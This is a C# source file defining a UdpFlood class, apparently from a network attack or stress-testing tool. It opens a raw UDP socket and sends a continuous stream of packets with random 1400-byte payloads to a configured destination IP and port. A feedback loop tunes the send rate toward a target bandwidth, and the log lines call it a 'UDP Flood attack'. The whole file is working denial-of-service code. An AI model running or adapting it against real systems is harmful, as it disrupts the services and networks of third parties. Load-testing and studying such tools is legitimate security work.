using System;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using System.Net.Sockets;
using System.Diagnostics;
using NLog;
using PacketDotNet;
using SharpPcap;
using SharpPcap.LibPcap;
using Dorothy.Models;

namespace Dorothy.Models
{
    public class UdpFlood : IDisposable
    {
        private static readonly ILogger Logger = LogManager.GetCurrentClassLogger();
        private readonly PacketParameters _params;
        private readonly CancellationToken _cancellationToken;
        private Socket? _socket;
        public event EventHandler<PacketEventArgs>? PacketSent;

        public UdpFlood(PacketParameters parameters, CancellationToken cancellationToken)
        {
            _params = parameters;
            _cancellationToken = cancellationToken;
        }

        protected virtual void OnPacketSent(byte[] packet, IPAddress sourceIp, IPAddress destinationIp, int port)
        {
            PacketSent?.Invoke(this, new PacketEventArgs(packet, sourceIp, destinationIp, port));
        }

        public async Task StartAsync()
        {
            Logger.Info("Starting UDP Flood attack.");

            try
            {
                _socket = new Socket(AddressFamily.InterNetwork, SocketType.Raw, System.Net.Sockets.ProtocolType.Udp);
                _socket.SetSocketOption(SocketOptionLevel.IP, SocketOptionName.HeaderIncluded, false);

                byte[] udpHeader = new byte[8];  // UDP header size
                byte[] payload = new byte[1400]; // Payload size

                var random = new Random();
                // Account for full Ethernet frame: Ethernet header (14) + IP header (20) + UDP header (8) + payload (1400) + FCS (4)
                // Raw sockets send at Layer 3, OS adds Ethernet frame
                int totalPacketSize = 14 + 20 + udpHeader.Length + payload.Length + 4; // Ethernet (14) + IP (20) + UDP (8) + payload (1400) + FCS (4) = 1446 bytes

                await Task.Run(() =>
                {
                    var stopwatch = Stopwatch.StartNew();
                    var endpoint = new IPEndPoint(_params.DestinationIp, 0);
                    byte[] fullPacket = new byte[udpHeader.Length + payload.Length];
                    
                    // Dynamic rate control: measure actual rate and adjust smoothly
                    int packetsSent = 0;
                    var rateMeasurementStartTime = DateTime.UtcNow;
                    double rateMultiplier = 1.8; // Start with higher multiplier for faster ramp-up
                    double targetMbps = _params.BytesPerSecond * 8.0 / 1_000_000;
                    // Measure more frequently for high rates to adjust faster
                    int measurementInterval = targetMbps > 64 ? 150 : (targetMbps > 32 ? 200 : 250);
                    double actualMbps = 0;
                    bool isBehindTarget = true; // Start by sending aggressively
                    double lastActualMbps = 0;
                    int stableMeasurements = 0;

                    // Calculate base rate (will be adjusted dynamically)
                    double basePacketsPerSecond = (double)_params.BytesPerSecond / totalPacketSize;
                    double targetPacketsPerSecond = basePacketsPerSecond;

                    while (!_cancellationToken.IsCancellationRequested)
                    {
                        try
                        {
                            // Send packet immediately - no waiting when trying to achieve target rate

                                // Create UDP header
                                BitConverter.GetBytes((ushort)_params.SourcePort).CopyTo(udpHeader, 0);
                                BitConverter.GetBytes((ushort)_params.DestinationPort).CopyTo(udpHeader, 2);
                                BitConverter.GetBytes((ushort)(8 + payload.Length)).CopyTo(udpHeader, 4); // Length
                                BitConverter.GetBytes((ushort)0).CopyTo(udpHeader, 6); // Checksum

                                // Generate random payload
                                random.NextBytes(payload);

                                // Combine header and payload
                                Buffer.BlockCopy(udpHeader, 0, fullPacket, 0, udpHeader.Length);
                                Buffer.BlockCopy(payload, 0, fullPacket, udpHeader.Length, payload.Length);

                                _socket.SendTo(fullPacket, endpoint);
                            OnPacketSent(fullPacket, _params.SourceIp, _params.DestinationIp, _params.DestinationPort);

                            packetsSent++;

                            // Measure actual rate and adjust multiplier frequently
                            if (packetsSent % measurementInterval == 0)
                            {
                                var elapsedSeconds = (DateTime.UtcNow - rateMeasurementStartTime).TotalSeconds;

                                if (elapsedSeconds > 0.05) // Need at least 50ms of data
                                {
                                    // Calculate actual packets per second
                                    double actualPacketsPerSecond = measurementInterval / elapsedSeconds;
                                    actualMbps = (actualPacketsPerSecond * totalPacketSize * 8.0) / 1_000_000;

                                    // Detect oscillation
                                    bool isOscillating = false;
                                    if (lastActualMbps > 0 && Math.Abs(actualMbps - lastActualMbps) / lastActualMbps > 0.10) // More than 10% change
                                    {
                                        isOscillating = true;
                                        stableMeasurements = 0;
                                    }
                                    else
                                    {
                                        isOscillating = false;
                                        stableMeasurements++;
                                    }
                                    lastActualMbps = actualMbps;

                                    // Calculate what multiplier we need to achieve target
                                    if (actualMbps > 0 && targetMbps > 0)
                                    {
                                        // If we're achieving X% of target, we need (target/actual) multiplier
                                        double newMultiplier = targetMbps / actualMbps;

                                        // Adjust smoothing based on oscillation and position relative to target
                                        if (isOscillating)
                                        {
                                            rateMultiplier = (rateMultiplier * 0.85) + (newMultiplier * 0.15); // Heavy smoothing
                                        }
                                        else if (isBehindTarget)
                            {
                                            // When behind target, allow faster adjustment to ramp up quickly
                                            // For high rates, use more aggressive 40/60 split; for low rates, use 50/50
                                            double smoothingFactor = targetMbps > 32 ? 0.4 : 0.5; // More aggressive for high rates
                                            rateMultiplier = (rateMultiplier * smoothingFactor) + (newMultiplier * (1.0 - smoothingFactor));
                                            stableMeasurements++;
                                        }
                                        else
                                        {
                                            // When at or above target, use moderate smoothing for stability
                                            rateMultiplier = (rateMultiplier * 0.75) + (newMultiplier * 0.25);
                                            stableMeasurements++;
                                        }

                                        // Clamp multiplier to reasonable range based on target rate
                                        // Increased max based on target rate: 8.0x for very high rates (>100), 6.0x for high (>64), 5.0x for medium (>32), 3.0x for low (>10), 1.5x for very low
                                        double maxMultiplierClamp = targetMbps > 100 ? 8.0 : (targetMbps > 64 ? 6.0 : (targetMbps > 32 ? 5.0 : (targetMbps > 10 ? 3.0 : 1.5)));
                                        rateMultiplier = Math.Max(0.8, Math.Min(maxMultiplierClamp, rateMultiplier));

                                        // Check if we're behind target - use wider tolerance for stability
                                        isBehindTarget = actualMbps < targetMbps * 0.95; // 5% tolerance

                                        Logger.Info($"UDP rate feedback: actual={actualMbps:F2} Mbps, target={targetMbps:F2} Mbps, multiplier={rateMultiplier:F3}, behind={isBehindTarget}, oscillating={isOscillating}");
                                    }

                                    // Reset measurement
                                    rateMeasurementStartTime = DateTime.UtcNow;
                                }
                            }

                            // Always apply delay based on target rate, but adjust multiplier based on feedback
                            // This ensures we respect low Mbps settings (like 1 Mbps) from the start
                            // But also allows reaching high Mbps (like 100 Mbps) by using aggressive multipliers
                            double adjustedPacketsPerSecond = basePacketsPerSecond;
                            
                            // If we have measurements and are significantly ahead, use target rate directly
                            // Otherwise, apply multiplier to compensate for overhead
                            if (actualMbps > 0 && actualMbps > targetMbps * 1.05 && stableMeasurements >= 2)
                            {
                                // We're ahead and stable - use target rate directly to maintain exact target
                                adjustedPacketsPerSecond = basePacketsPerSecond;
                            }
                            else if (packetsSent >= measurementInterval && rateMultiplier > 0)
                            {
                                // Apply multiplier to compensate for overhead
                                // For very high rates, allow up to 8.0x multiplier; for high rates 6.0x; for low rates, cap lower to respect target
                                double maxMultiplier = targetMbps > 100 ? 8.0 : (targetMbps > 64 ? 6.0 : (targetMbps > 32 ? 5.0 : (targetMbps > 10 ? 3.0 : 1.5))); // More aggressive for high rates
                                adjustedPacketsPerSecond = basePacketsPerSecond * Math.Min(rateMultiplier, maxMultiplier);
                            }
                            else
                            {
                                // Initial phase - use multiplier based on target rate
                                // Low rates: use 1.0x (no overshoot), Medium: 1.8x, High rates: 3.5x, Very high: 4.0x for faster ramp-up
                                double initialMultiplier = targetMbps > 100 ? 4.0 : (targetMbps > 64 ? 3.5 : (targetMbps > 32 ? 2.5 : (targetMbps > 10 ? 1.8 : 1.0)));
                                adjustedPacketsPerSecond = basePacketsPerSecond * initialMultiplier;
                            }
                            
                            // Always apply delay based on adjusted rate to respect target Mbps
                            double microsecondsPerPacket = 1_000_000.0 / adjustedPacketsPerSecond;
                            long ticksPerPacket = (long)(microsecondsPerPacket * Stopwatch.Frequency / 1_000_000.0);
                            
                            if (ticksPerPacket > 0)
                            {
                                long currentTicks = stopwatch.ElapsedTicks;
                                long nextPacketTime = currentTicks + ticksPerPacket;
                                
                                // Wait until it's time to send the next packet
                                if (nextPacketTime > currentTicks)
                                {
                                    while (stopwatch.ElapsedTicks < nextPacketTime)
                                {
                                    Thread.SpinWait(1);
                                    }
                                }
                            }
                        }
                        catch (Exception ex)
                        {
                            Logger.Error(ex, "Failed sending UDP packet (Layer 3).");
                        }
                    }
                }, _cancellationToken);
            }
            catch (Exception ex)
            {
                Logger.Error(ex, "UDP Flood attack failed.");
                throw;
            }
        }

        public void Dispose()
        {
            _socket?.Dispose();
        }
    }
} 